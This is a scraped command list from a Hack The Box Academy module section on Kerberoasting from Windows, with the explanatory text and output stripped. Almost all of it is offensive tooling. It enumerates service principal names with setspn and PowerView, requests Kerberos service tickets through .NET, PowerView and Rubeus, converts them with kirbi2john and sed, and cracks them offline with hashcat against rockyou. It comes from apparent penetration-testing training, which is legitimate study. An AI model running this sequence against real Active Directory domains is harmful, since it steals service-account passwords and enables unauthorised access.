# Section 18: Kerberoasting - from Windows

- Module: Active Directory Enumeration & Attacks (143)
- URL: https://academy.hackthebox.com/app/module/143/section/1423
- Code/command blocks: 22

> Terminal output is omitted; only commands & scripts are captured.

```cmd
setspn.exe -Q */*
```

```powershell
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/DEV-PRE-SQL.{{DOMAIN}}:1433"
```

```powershell
setspn.exe -T {{DOMAIN_UPPER}} -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }
```

```bash
echo "<base64 blob>" |  tr -d \\n 
```

```bash
cat encoded_file | base64 -d > sqldev.kirbi
```

```bash
python2.7 kirbi2john.py sqldev.kirbi
```

```bash
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat
```

```bash
cat sqldev_tgs_hashcat 
```

```bash
hashcat -m 13100 sqldev_tgs_hashcat /usr/share/wordlists/rockyou.txt 
```

```powershell
Import-Module .\PowerView.ps1
Get-DomainUser * -spn | select samaccountname
```

```powershell
Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat
```

```powershell
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_tgs.csv -NoTypeInformation
```

```powershell
cat .\ilfreight_tgs.csv
```

```powershell
.\Rubeus.exe
```

```powershell
.\Rubeus.exe kerberoast /stats
```

```powershell
.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap
```

```powershell
.\Rubeus.exe kerberoast /user:testspn /nowrap
```

```powershell
Get-DomainUser testspn -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes
```

```bash
hashcat -m 13100 rc4_to_crack /usr/share/wordlists/rockyou.txt 
```

```powershell
Get-DomainUser testspn -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes
```

```powershell
 .\Rubeus.exe kerberoast /user:testspn /nowrap
```

```bash
hashcat -m 19700 aes_to_crack /usr/share/wordlists/rockyou.txt 
```

